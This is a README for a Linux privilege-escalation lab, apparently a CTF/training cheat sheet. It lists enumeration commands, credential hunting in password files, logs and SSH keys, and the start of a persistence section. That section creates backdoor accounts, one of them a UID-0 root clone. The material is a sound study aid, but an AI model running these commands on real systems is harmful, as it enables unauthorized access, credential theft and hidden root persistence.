<img width="900" height="160" alt="banner-01-enum" src="https://github.com/user-attachments/assets/434e21c3-38d5-4dfc-bad2-96a435ba9c8b" /><img width="1200" height="110" alt="divider-blue" src="https://github.com/user-attachments/assets/d38e8cb0-2700-42a7-b936-29ce5d06bdf4" /><div align="center">

<img src="https://capsule-render.vercel.app/api?type=waving&color=0:8B0000,50:FF4500,100:FFD700&height=200&section=header&text=Linux%20PrivEsc%20Lab&fontSize=55&fontColor=ffffff&animation=fadeIn&fontAlignY=38&desc=Enumeration%20%C2%B7%20Persistence%20%C2%B7%20Privilege%20Escalation&descAlignY=58&descSize=20" width="100%"/>

<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=600&size=22&pause=1000&color=F75C7E&center=true&vCenter=true&width=600&lines=29+Hands-On+Linux+Techniques+🛠️;Run+in+Your+Own+Lab+Only+⚠️;Enumerate+→+Persist+→+Escalate+🚀" alt="Typing SVG" /></a>

<img src="assets/pulse.svg" width="24"/> <b>LIVE LAB MODE</b> <img src="assets/pulse.svg" width="24"/>

<br>

![Linux](https://img.shields.io/badge/OS-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)
![Bash](https://img.shields.io/badge/Shell-Bash-4EAA25?style=for-the-badge&logo=gnu-bash&logoColor=white)
![CTF](https://img.shields.io/badge/Purpose-CTF%20%2F%20Lab-blueviolet?style=for-the-badge)
![Count](https://img.shields.io/badge/Techniques-29-critical?style=for-the-badge)
![Author](https://img.shields.io/badge/Author-m.manikandan-orange?style=for-the-badge)

> ⚠️ **WARNING — Authorized lab / CTF environments only.** Never test on systems you do not own. Always run the 🧹 **Cleanup** steps after each lab.

</div>

---

## 📋 Table of Contents

<details open>
<summary><b>🔵 🔍 &nbsp;ENUMERATION — 8 techniques</b></summary>
<br>

| # | Technique |
|---|-----------|
| 01 | [🖥️ System Information](#01---system-information) |
| 02 | [👥 Users & Groups](#02---user--group-enumeration) |
| 03 | [🌐 Network](#03---network-enumeration) |
| 04 | [⚙️ Processes & Services](#04---process--services) |
| 05 | [⏰ Scheduled Tasks](#05---scheduled-tasks) |
| 06 | [📁 File System & Interesting Files](#06---file-system--interesting-files) |
| 07 | [🔑 Credentials & Sensitive Files](#07---credentials--sensitive-files) |
| 08 | [📦 Installed Software & Kernel](#08---installed-software--kernel-exploits) |

</details>

<details open>
<summary><b>🟠 🔒 &nbsp;PERSISTENCE — 4 techniques</b></summary>
<br>

| # | Technique |
|---|-----------|
| 01 | [👤 Backdoor User](#01---backdoor-user) |
| 02 | [📜 .bashrc / .bash_profile](#02---bashrc--bash_profile-persistence) |
| 03 | [🔐 SSH Public Key](#03---ssh-public-key-persistence) |
| 04 | [🛰️ Systemd Service + Netcat](#04---systemd-service--netcat) |

</details>

<details open>
<summary><b>🔴 ⚡ &nbsp;PRIVILEGE ESCALATION — 17 techniques</b></summary>
<br>

| # | Technique |
|---|-----------|
| 01 | [🟥 SUID Binary Abuse](#01---suid-binary-abuse) |
| 02 | [🧬 Linux Capabilities](#02---linux-capabilities) |
| 03 | [🔓 Vulnerable Sudo / GTFOBins](#03---vulnerable-sudo--gtfobins) |
| 04 | [💉 Sudo SETENV + LD_PRELOAD](#04---sudo-setenv--ld_preload) |
| 05 | [🧩 Shared Object Injection](#05---shared-object-injection) |
| 06 | [⏱️ Cron Job Abuse](#06---cron-job-abuse) |
| 07 | [🛤️ Writable PATH Hijack](#07---writable-path-hijack) |
| 08 | [🔧 Systemd Service Abuse](#08---systemd-service-abuse) |
| 09 | [🐳 Docker Group Escalation](#09---docker-group-escalation) |
| 10 | [📦 Incus / LXC Container](#10---incus--lxc-container) |
| 11 | [🗄️ NFS no_root_squash](#11---nfs-no_root_squash) |
| 12 | [🛡️ Polkit rules.d](#12---polkit-rulesd) |
| 13 | [📝 Writable /etc/passwd](#13---writable-etcpasswd) |
| 14 | [🔏 Readable Root SSH Key](#14---readable-root-ssh-key) |
| 15 | [🐚 Reverse Shell via nc](#15---reverse-shell-via-nc) |
| 16 | [🧨 Kernel Exploits](#16---kernel-exploits) |
| 17 | [📚 Internals Reference](#17---internals-reference) |

</details>
---


## 🗺️ How to Use This Guide

> 💡 **Workflow:** run the 🔵 enumeration checks first → pick a 🟠 persistence method if you need to keep access → then attempt the 🔴 escalation path. Each technique ends with 🧹 **Cleanup** — always run it when the lab is over.

| Phase | Color | Range | Goal |
|-------|-------|-------|------|
| 🔍 Enumeration | 🔵 blue | 01–08 | Map the system, find weaknesses |
| 🔒 Persistence | 🟠 orange | 01–04 | Keep access across reboots |
| ⚡ Privilege Escalation | 🔴 red | 01–17 | Become root |

---

![Uploading b<svg width="900" height="160" xmlns="http://www.w3.org/2000/svg" xmlns:c2pa="http://c2pa.org/manifest">
<defs>
  <linearGradient id="bg01" x1="0%" y1="0%" x2="100%" y2="100%">
    <stop offset="0%" stop-color="#0d1117"/>
    <stop offset="50%" stop-color="#0a1a30">
      <animate attributeName="stop-color" values="#0a1a30;#061020;#0a1a30" dur="6s" repeatCount="indefinite"/>
    </stop>
    <stop offset="100%" stop-color="#0d1117"/>
  </linearGradient>
</defs>
<style>
.scan{animation:sc 4s linear infinite}
@keyframes sc{from{transform:translateX(-10px)}to{transform:translateX(910px)}}
.dp1{animation:dp 2.0s ease infinite}
.dp2{animation:dp 2.0s ease infinite .5s}
.dp3{animation:dp 2.0s ease infinite 1s}
.dp4{animation:dp 2.0s ease infinite 1.5s}
@keyframes dp{0%,100%{opacity:.15}50%{opacity:1}}
.rp1{animation:rp 2.0s ease infinite}
.rp2{animation:rp 2.0s ease infinite .5s}
.rp3{animation:rp 2.0s ease infinite 1s}
.rp4{animation:rp 2.0s ease infinite 1.5s}
@keyframes rp{0%{r:8;opacity:.8}100%{r:35;opacity:0}}
.bl{animation:bl 3s linear infinite}
.bl2{animation:bl 3s linear infinite 1s}
.bl3{animation:bl 3s linear infinite 2s}
@keyframes bl{0%{transform:translateY(-10px);opacity:0}20%{opacity:.5}80%{opacity:.5}100%{transform:translateY(170px);opacity:0}}
.ttl{animation:tg 3s ease infinite}
@keyframes tg{0%,100%{fill:#58a6ff;filter:drop-shadow(0 0 6px rgba(88,166,255,.7))}50%{fill:#a5d6ff;filter:drop-shadow(0 0 22px rgba(88,166,255,1))}}
.cur{animation:c 1s step-end infinite}
@keyframes c{50%{opacity:0}}
.dl{stroke-dasharray:5,4}
.dl1{animation:da 1.5s linear infinite}
@keyframes da{from{stroke-dashoffset:0}to{stroke-dashoffset:28}}
</style>
<rect width="900" height="160" rx="10" fill="url(#bg01)"/>
<rect width="900" height="160" rx="10" fill="none" stroke="#1b3a6b" stroke-width="1.5"/>
<line x1="0" y1="40" x2="900" y2="40" stroke="#0d1f3c" stroke-width="1"/>
<line x1="0" y1="80" x2="900" y2="80" stroke="#0d1f3c" stroke-width="1"/>
<line x1="0" y1="120" x2="900" y2="120" stroke="#0d1f3c" stroke-width="1"/>
<line x1="225" y1="0" x2="225" y2="160" stroke="#0d1f3c" stroke-width="1"/>
<line x1="675" y1="0" x2="675" y2="160" stroke="#0d1f3c" stroke-width="1"/>
<text x="30"  y="0" font-family="monospace" font-size="9" fill="#112244" class="bl">01101001</text>
<text x="800" y="0" font-family="monospace" font-size="9" fill="#112244" class="bl2">10010110</text>
<text x="500" y="0" font-family="monospace" font-size="9" fill="#112244" class="bl3">11001010</text>
<rect class="scan" y="0" width="3" height="160" fill="#58a6ff" opacity=".2" rx="1"/>
<circle cx="80" cy="45" r="6" fill="#58a6ff" class="dp1"/>
<circle cx="80" cy="45" r="8" fill="none" stroke="#58a6ff" stroke-width="1.5" class="rp1"/>
<circle cx="820" cy="45" r="6" fill="#58a6ff" class="dp2"/>
<circle cx="820" cy="45" r="8" fill="none" stroke="#58a6ff" stroke-width="1.5" class="rp2"/>
<circle cx="80" cy="125" r="5" fill="#79c0ff" class="dp3"/>
<circle cx="80" cy="125" r="8" fill="none" stroke="#79c0ff" stroke-width="1" class="rp3"/>
<circle cx="820" cy="125" r="5" fill="#79c0ff" class="dp4"/>
<circle cx="820" cy="125" r="8" fill="none" stroke="#79c0ff" stroke-width="1" class="rp4"/>
<line x1="80" y1="45" x2="80" y2="125" stroke="#1a3a6a" stroke-width="1" class="dl dl1"/>
<line x1="820" y1="45" x2="820" y2="125" stroke="#1a3a6a" stroke-width="1" class="dl dl1"/>
<circle cx="22" cy="18" r="5" fill="#ff5f57"/>
<circle cx="40" cy="18" r="5" fill="#febc2e"/>
<circle cx="58" cy="18" r="5" fill="#28c840"/>
<text x="20" y="50" font-family="monospace" font-size="12" fill="#8b949e">root@kali:~#</text>
<text x="122" y="50" font-family="monospace" font-size="12" fill="#3fb950">./enum.sh --all-modules</text>
<rect x="316" y="39" width="8" height="13" fill="#3fb950" class="cur"/>
<circle cx="450" cy="30" r="18" fill="none" stroke="#58a6ff" stroke-width="1.5" opacity=".3">
  <animate attributeName="r" values="18;30;18" dur="4s" repeatCount="indefinite"/>
  <animate attributeName="opacity" values=".3;0;.3" dur="4s" repeatCount="indefinite"/>
</circle>
<circle cx="450" cy="30" r="8" fill="none" stroke="#58a6ff" stroke-width="2" opacity=".6"/>
<line x1="456" y1="36" x2="468" y2="48" stroke="#58a6ff" stroke-width="2.5" stroke-linecap="round" opacity=".6"/>
<text x="450" y="100" text-anchor="middle" font-family="monospace" font-size="26" font-weight="bold" class="ttl">🔍  Linux Enumeration</text>
<text x="450" y="126" text-anchor="middle" font-family="monospace" font-size="12" fill="#6e7681">System  ·  Users  ·  Network  ·  Files  ·  Credentials</text>
<text x="450" y="148" text-anchor="middle" font-family="monospace" font-size="10" fill="#30363d">◀  Phase 1 of 3  ▶</text>
<metadata><c2pa:manifest>AAAWgmp1bWIAAAAeanVtZGMycGEAEQAQgAAAqgA4m3EDYzJwYQAAABZcanVtYgAAAEdqdW1kYzJtYQARABCAAACqADibcQN1cm46YzJwYTo4NDc1OTlhYS1iMDJmLTQ4MGYtOTEwZS1jMTg3Yjk1NmY5NDgAAAADl2p1bWIAAAApanVtZGMyYXMAEQAQgAAAqgA4m3EDYzJwYS5hc3NlcnRpb25zAAAAALxqdW1iAAAARGp1bWRjYm9yABEAEIAAAKoAOJtxE2MycGEuaW5ncmVkaWVudC52MwAAAAAYYzJzaBNMe5vXJuFqfxQ6x3IJb/QAAABwY2JvcqNpZGM6Zm9ybWF0bWltYWdlL3N2Zyt4bWxqaW5zdGFuY2VJRHgseG1wOmlpZDphYjFiZDZiMC01MjA4LTQxYWMtYTY4Ni03ZGYyZDVlNjg5NGVscmVsYXRpb25zaGlwaHBhcmVudE9mAAAB4mp1bWIAAABBanVtZGNib3IAEQAQgAAAqgA4m3ETYzJwYS5hY3Rpb25zLnYyAAAAABhjMnNoW/y5wZu0HJrpoHrLQlw+uQAAAZljYm9yomdhY3Rpb25zgqJmYWN0aW9ua2MycGEub3BlbmVkanBhcmFtZXRlcnOha2luZ3JlZGllbnRzgaJjdXJseC1zZWxmI2p1bWJmPWMycGEuYXNzZXJ0aW9ucy9jMnBhLmluZ3JlZGllbnQudjNkaGFzaFggssdQyXXoubcn5OZ8igttQZpO6E3/7RPqi88usKIJreSkZmFjdGlvbngdY29tLmFudGhyb3BpYy5jbGF1ZGUucHJvdmlkZWRqcGFyYW1ldGVyc6F4H2NvbS5hbnRocm9waWMub3JpZ2luLWNvbmZpZGVuY2VndW5rbm93bmtkZXNjcmlwdGlvbnhmQ2xhdWRlIHByb3ZpZGVkIHRoaXMgZmlsZSBhdCB0aGUgcmVxdWVzdCBvZiBhIHVzZXIgYW5kIG1heSBoYXZlIGNyZWF0ZWQgb3IgbW9kaWZpZWQgdGhlIGZpbGUgY29udGVudHMubXNvZnR3YXJlQWdlbnShZG5hbWVmQ2xhdWRlcmFsbEFjdGlvbnNJbmNsdWRlZPUAAADIanVtYgAAAEBqdW1kY2JvcgARABCAAACqADibcRNjMnBhLmhhc2guZGF0YQAAAAAYYzJzaPxTOaFchCQLWspojvnoKlgAAACAY2JvcqVjYWxnZnNoYTI1NmNwYWRMAAAAAAAAAAAAAAAAZGhhc2hYIN0AFAoLZ66amlVocvufhBQCBKRRtZ5pO7VBQaObcVB6ZG5hbWVuanVtYmYgbWFuaWZlc3RqZXhjbHVzaW9uc4GiZXN0YXJ0GRJwZmxlbmd0aBkeBAAAAj5qdW1iAAAAJ2p1bWRjMmNsABEAEIAAAKoAOJtxA2MycGEuY2xhaW0udjIAAAACD2Nib3KlY2FsZ2ZzaGEyNTZpc2lnbmF0dXJleE1zZWxmI2p1bWJmPS9jMnBhL3VybjpjMnBhOjg0NzU5OWFhLWIwMmYtNDgwZi05MTBlLWMxODdiOTU2Zjk0OC9jMnBhLnNpZ25hdHVyZWppbnN0YW5jZUlEeCx4bXA6aWlkOmEyZGNkYmRjLWZlYzctNDAwNi04MWIxLTJmMTJhM2ZhMTNmM3JjcmVhdGVkX2Fzc2VydGlvbnODomN1cmx4LXNlbGYjanVtYmY9YzJwYS5hc3NlcnRpb25zL2MycGEuaW5ncmVkaWVudC52M2RoYXNoWCCyx1DJdei5tyfk5nyKC21Bmk7oTf/tE+qLzy6wogmt5KJjdXJseCpzZWxmI2p1bWJmPWMycGEuYXNzZXJ0aW9ucy9jMnBhLmFjdGlvbnMudjJkaGFzaFggCvx+z083b9kzi7L+FoVck2KfmLNxzd+ln3+QzO2sSqKiY3VybHgpc2VsZiNqdW1iZj1jMnBhLmFzc2VydGlvbnMvYzJwYS5oYXNoLmRhdGFkaGFzaFggTU7irO6FfEUD9N7NFgiBqPSNXLl+XGOKWp7pUYuTpzV0Y2xhaW1fZ2VuZXJhdG9yX2luZm+jZG5hbWVvQW50aHJvcGljIEZpbGVzZ3ZlcnNpb25lMS4wLjBrc3BlY1ZlcnNpb25lMi40LjAAABA4anVtYgAAAChqdW1kYzJjcwARABCAAACqADibcQNjMnBhLnNpZ25hdHVyZQAAABAIY2JvctKEWQISogEmGCFZAgowggIGMIIBjaADAgECAhRA5aAK7sI50L64g/oGQgU9Z1UTADAKBggqhkjOPQQDAzBJMRcwFQYDVQQKEw5BbnRocm9waWMsIFBCQzEuMCwGA1UEAxMlQW50aHJvcGljIENvbnRlbnQgQ3JlZGVudGlhbHMgUm9vdCBDQTAeFw0yNjA4MDcxODQzNTZaFw0yODA4MDYxOTQzNTZaMEQxFzAVBgNVBAoTDkFudGhyb3BpYywgUEJDMSkwJwYDVQQDEyBBbnRocm9waWMgQ2xhdWRlIENvbnRlbnQgU2lnbmluZzBZMBMGByqGSM49AgEGCCqGSM49AwEHA0IABJh6CmvLUBgFFNU0vUKlOVtE6djd17L5SuwX0LemFisBM3dkd/3cyjxFA3Qo5S46fX0/ihY0VZ7mfb9KF703t5OjWDBWMA4GA1UdDwEB/wQEAwIHgDAVBgNVHSUEDjAMBgorBgEEAYPoXgIBMAwGA1UdEwEB/wQCMAAwHwYDVR0jBBgwFoAUzlHiBIFOZFsj+OPEz5o+nMHXXMIwCgYIKoZIzj0EAwMDZwAwZAIwMXMdFJ4BetLLVY7ORuE9noqbbAZOZn/aArXyTwFAZfKrPzxF2vPoJNf1+UCdg1XGAjBwX1zd9WGqYkqmL5SFqw1QySjr1zJfpJM9+1rdDwSPLMOPOjKuiXjoU/pUUeG9RwmhY3BhZFkNngAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPZYQEu36KRIhzursnZ81R9/D0k0CTH28GvQA5zLC9sNGyPQ4tWl2uPXUE2kDVLA09gIs8nJjXBanlOuGZWJw6VD0HE=</c2pa:manifest></metadata></svg>anner-01-enum.svg…]()



---

### 01 · 🖥️ System Information

<details>
<summary>📂 Click to expand</summary>
<br>

```bash
uname -a                  # Kernel version, architecture
cat /proc/version         # Detailed kernel, compiler info
cat /etc/os-release       # Distro name and version
lsb_release -a            # Another distro check
hostnamectl               # Hostname, kernel, architecture
cat /etc/*-release        # Catch-all for release files
cat /proc/cpuinfo         # CPU details
cat /proc/meminfo         # Memory details
```
</details>

---

### 02 · 👥 User & Group Enumeration

<details>
<summary>📂 Click to expand</summary>
<br>

```bash
id                                      # Current user, groups
whoami                                  # Current username
cat /etc/passwd                         # All users (look for shells)
cat /etc/shadow                         # Password hashes (needs root)
cat /etc/group                          # All groups
getent passwd                           # Same as /etc/passwd
sudo -l                                 # Allowed sudo commands (GOLD)
cat /etc/sudoers                        # Sudo config (if readable)
find / -user <username> 2>/dev/null     # Files owned by user
lastlog                                 # Last login of all users
w                                       # Who is logged on right now
```
</details>

---

### 03 · 🌐 Network Enumeration

<details>
<summary>📂 Click to expand</summary>
<br>

```bash
ifconfig / ip a s                       # Interfaces and IPs
ip route / route -n                     # Routing table
arp -a                                  # ARP cache
netstat -tulpn / ss -tulpn              # Listening ports + processes
netstat -antp / ss -antp                # All TCP connections with PIDs
cat /etc/hosts                          # Static host mappings
cat /etc/resolv.conf                    # DNS servers
iptables -L -n / nft list ruleset       # Firewall rules
```
</details>

---

### 04 · ⚙️ Process & Services

<details>
<summary>📂 Click to expand</summary>
<br>

```bash
ps aux                                                        # All processes
ps aux --forest                                               # Tree view
systemctl list-units --type=service --state=running           # Active services
service --status-all                                          # SysV services
top -n 1 -b                                                   # One-shot snapshot
pspy                                                          # Unprivileged monitor (CTF)
cat /proc/1/comm                                              # PID 1 init system
ls -la /proc/*/exe 2>/dev/null | grep -v "Permission denied"  # Find binaries
cat /etc/inetd.conf /etc/xinetd.conf                          # Legacy service configs
```
</details>

---

### 05 · ⏰ Scheduled Tasks

<details>
<summary>📂 Click to expand</summary>
<br>

```bash
crontab -l                     # Current user cron jobs
cat /etc/crontab               # System-wide crontab
ls -la /etc/cron.*             # daily / hourly / weekly jobs
systemctl list-timers --all    # Systemd timers
cat /etc/anacrontab            # Anacron jobs
```
</details>

---

### 06 · 📁 File System & Interesting Files

<details>
<summary>📂 Click to expand</summary>
<br>

```bash
find / -writable -type f 2>/dev/null                                    # World-writable files
find / -perm -4000 -type f 2>/dev/null                                  # SUID binaries
find / -perm -2000 -type f 2>/dev/null                                  # SGID binaries
find / -perm -o=r -type f 2>/dev/null                                   # World-readable files
find / -name "*.conf" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null    # Config files
find / -name "*.log" -type f 2>/dev/null                                # Log files (may leak creds)
find / -name ".git" -type d 2>/dev/null                                 # Git repos
ls -la /var/backups /opt /tmp /var/tmp                                  # Backups / scratch
cat /etc/fstab                                                          # Mounted filesystems
mount                                                                   # Currently mounted
df -h                                                                   # Disk usage
```
</details>

---

### 07 · 🔑 Credentials & Sensitive Files

<details>
<summary>📂 Click to expand</summary>
<br>

```bash
grep -rni "password" /etc/ 2>/dev/null
grep -rni "passwd" /var/log/ 2>/dev/null
find / -name "id_rsa" -o -name "*.pem" -o -name "*.key" 2>/dev/null    # SSH keys
history
cat ~/.bash_history
cat ~/.mysql_history
env                                                                      # Environment variables
cat /proc/1/environ | tr '\0' '\n'                                    # Env of PID 1
```
</details>

---

### 08 · 📦 Installed Software & Kernel Exploits

<details>
<summary>📂 Click to expand</summary>
<br>

```bash
dpkg -l / rpm -qa                     # Installed packages (Debian / RPM)
sudo -V                               # Sudo version
pkexec --version                      # Polkit version
ls -la /usr/local/bin /usr/bin /bin   # Custom binaries
ls -la /usr/sbin /sbin                # Admin tools
apk list --installed                  # Alpine Linux
uname -a                              # Kernel → check Exploit-DB
```
**Useful Tools:**
```bash
# Clone and run
git clone https://github.com/peass-ng/PEASS-ng.git
git clone https://github.com/The-Z-Labs/linux-exploit-suggester.git
git clone https://github.com/Aegrah/PANIX.git

pip install gtfobins-cli --break-system-packages
gtfo python
```
</details>


---

---

<img src="assets/divider-orange.svg" width="100%"/>


---

### 01 · 👤 Backdoor User

<details>
<summary>🎭 5 methods to create hidden / root users</summary>
<br>

**METHOD 1 — backdoor user**
```bash
groupdel backdoor 2>/dev/null; useradd -m -s /bin/bash -U backdoor && echo 'backdoor:backdoor' | chpasswd
```
**METHOD 2 — ghost (UID 0 root clone)**
```bash
groupadd ghost 2>/dev/null; useradd -o -u 0 -g 0 -s /bin/bash -M -d /root ghost && echo 'ghost:ghost' | chpasswd
```
**METHOD 3 — hacker (manual passwd/shadow)**
```bash
HASH=$(openssl passwd -6 'hacker') && \
  echo "hacker:x:1337:1337::/home/hacker:/bin/bash" >> /etc/passwd && \
  echo "hacker:${HASH}:19000:0:99999:7:::" >> /etc/shadow && \
  groupadd -g 1337 hacker && mkdir -p /home/hacker && chown 1337:1337 /home/hacker
```
**METHOD 4 — support (sudo group)**
```bash
useradd -m -s /bin/bash -U support && echo 'support:support' | chpasswd && usermod -aG sudo support
```
